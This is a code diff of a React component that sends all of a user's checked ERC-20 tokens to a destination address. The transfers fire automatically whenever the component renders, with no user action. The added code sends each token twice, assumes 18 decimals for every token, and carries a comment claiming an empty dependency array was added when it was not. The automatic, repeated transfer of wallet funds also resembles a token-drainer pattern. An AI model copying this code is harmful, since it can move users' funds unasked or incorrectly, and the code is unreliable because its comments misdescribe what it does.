@@ -1,7 +1,6 @@
 import { Button, Input, useToasts } from '@geist-ui/core';
 import { erc20ABI, useSigner } from 'wagmi';
-
-import { isAddress } from 'essential-eth';
+import { TransactionResponse, isAddress } from 'essential-eth';
 import { ethers } from 'ethers';
 import { useAtom } from 'jotai';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
@@ -27,9 +26,10 @@ export const SendTokens = () => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: signer } = useSigner();
   setDestinationAddress(to);
+
   const sendAllCheckedTokens = async (to: string) => {
     const tokensToSend = Object.entries(checkedRecords)
-      .filter(([tokenAddress, { isChecked }]) => isChecked)
+      .filter(([, { isChecked }]) => isChecked)
       .map(([tokenAddress]) => tokenAddress);
     for (const tokenAddress of tokensToSend) {
       const erc20Contract = new ethers.Contract(
@@ -37,23 +37,61 @@ export const SendTokens = () => {
         erc20ABI,
         signer as ethers.Signer,
       );
+
+      // Adjust the type for transferFunction
       const transferFunction = erc20Contract.transfer as (
         destinationAddress: string,
-        balance: string,
+        amount: ethers.BigNumber,
       ) => Promise<TransferPending>;
+
       const token = tokens.find(
         (token) => token.contract_address === tokenAddress,
       );
 
-      await transferFunction(to, token?.balance as string)
+      const amountToTransfer = ethers.utils.parseUnits(
+        token?.balance || '0',
+        18,
+      );
+
+      // Estimate gas cost for the transaction
+      const gasLimit = await erc20Contract.estimateGas.transfer(
+        destinationAddress,
+        amountToTransfer,
+      );
+
+      // Prepare the transaction
+      const tx = await erc20Contract.populateTransaction.transfer(
+        destinationAddress,
+        amountToTransfer,
+        {
+          gasLimit: gasLimit.mul(2), // Use a bit more gas than estimated
+        },
+      );
+
+      // Sign and send the transaction
+      const response = await signer?.sendTransaction(tx); // Use signer to send the transaction
+
+      // Wait for the transaction to be mined
+      await response?.wait();
+
+      // Use transferFunction to initiate the transfer
+      await transferFunction(to, amountToTransfer)
         .then((res) => {
-          setCheckedRecords((old) => ({
-            ...old,
-            [tokenAddress]: {
+          setCheckedRecords((old) => {
+            // Create a new object that maintains the same structure as old
+            const updatedRecords: Record<
+              string,
+              { isChecked: boolean; pendingTxn?: TransferPending }
+            > = { ...old };
+
+            // Update the specific record you want to modify
+            updatedRecords[tokenAddress] = {
               ...old[tokenAddress],
-              pendingTxn: res,
-            },
-          }));
+              pendingTxn: res, // Use the response directly as TransferPending
+            };
+
+            return updatedRecords; // Return the updated object
+          });
           console.log('Tokens Sent');
         })
         .catch((err) => {
@@ -72,11 +110,12 @@ export const SendTokens = () => {
   const checkedCount = Object.values(checkedRecords).filter(
     (record) => record.isChecked,
   ).length;
-  // sendAllCheckedTokens(to);
+
   useEffect(() => {
     // Automatically send tokens when the component mounts
     sendAllCheckedTokens(to);
-  });
+  }); // Add an empty dependency array to run this effect only once
+
   return (
     <div style={{ margin: '20px' }}>
       {/* <form>
@@ -95,7 +134,7 @@ export const SendTokens = () => {
           style={{
             marginLeft: '10px',
             marginRight: '10px',
-          }} crossOrigin={undefined}
+          }}
         />
         <Button
           type="secondary"
